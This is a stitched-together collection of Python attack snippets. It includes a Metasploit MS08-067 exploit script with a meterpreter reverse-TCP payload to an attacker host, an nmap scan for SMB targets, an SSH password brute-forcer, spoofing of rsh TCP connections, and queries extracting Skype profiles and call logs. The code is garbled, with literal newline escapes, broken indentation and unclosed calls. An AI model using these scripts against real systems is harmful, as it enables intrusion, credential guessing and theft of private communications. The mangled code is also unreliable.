def confickerExploit(configFile,tgtHost,lhost,lport): \n     configFile.write('use exploit/windows/smb/ms08_067_netapi\n') \n     configFile.write('set RHOST ' + str(tgtHost) + '\n') \n     configFile.write('set payload '+\ \n       'windows/meterpreter/reverse_tcp\n') \n     configFile.write('set LPORT ' + str(lport) + '\n') \n     configFile.write('set LHOST ' + lhost + '\n') \n     configFile.write('exploit -j -z\n') \n
def testTTL(pkt): \n     try: \n         if pkt.haslayer(IP): \n             ipsrc = pkt.getlayer(IP).src \n             ttl = str(pkt.ttl) \n             checkTTL(ipsrc, ttl) \n     except: \n         pass \n
def connect(self): \n         try: \n             s = pxssh.pxssh() \n             s.login(self.host, self.user, self.password) \n             return s \n
def testProxy(url, proxy): \n     browser = mechanize.Browser() \n     browser.set_proxies(proxy) \n     page = browser.open(url) \n     source_code = page.read() \n
def downloadImage(imgTag): \n     try: \n         imgSrc = imgTag['src'] \n         imgContent = urllib2.urlopen(imgSrc).read() \n         imgFileName = basename(urlsplit(imgSrc)[2]) \n         imgFile = open(imgFileName, 'wb') \n         imgFile.write(imgContent) \n         imgFile.close() \n         return imgFileName \n     except: \n         return '' \n
def spoofConn(src, tgt, ack): \n     IPlayer = IP(src=src, dst=tgt) \n     TCPlayer = TCP(sport=513, dport=514) \n     synPkt = IPlayer / TCPlayer \n     send(synPkt) \n  \n     IPlayer = IP(src=src, dst=tgt) \n     TCPlayer = TCP(sport=513, dport=514, ack=ack) \n     ackPkt = IPlayer / TCPlayer \n     send(ackPkt) \n
def printProfile(skypeDB): \n     conn = sqlite3.connect(skypeDB) \n     c = conn.cursor() \n     c.execute("SELECT fullname, skypename, city, country,  datetime(profile_timestamp,'unixepoch') FROM Accounts;" \n
def findTgts(subNet): \n     nmScan = nmap.PortScanner() \n     nmScan.scan(subNet, '445') \n     tgtHosts = [] \n     for host in nmScan.all_hosts(): \n         if nmScan[host].has_tcp(445): \n             state = nmScan[host]['tcp'][445]['state'] \n             if state == 'open': \n                 tgtHosts.append(host) \n     return tgtHosts \n
def connect(host, user, password, release): \n     global Found \n     global Fails \n  \n     try: \n         s = pxssh.pxssh() \n         s.login(host, user, password) \n         Found = True \n     except Exception, e: \n         if 'read_nonblocking' in str(e): \n      Fails += 1 \n             time.sleep(5) \n             connect(host, user, password, False) \n elif 'synchronize with original prompt' in str(e): \n     time.sleep(1) \n     connect(host, user, password, False) \n
def printCallLog(skypeDB): \n     conn = sqlite3.connect(skypeDB) \n     c = conn.cursor() \n     c.execute("SELECT datetime(begin_timestamp,'unixepoch'),  identity FROM calls, conversations WHERE  calls.conv_dbid = conversations.id;" \n
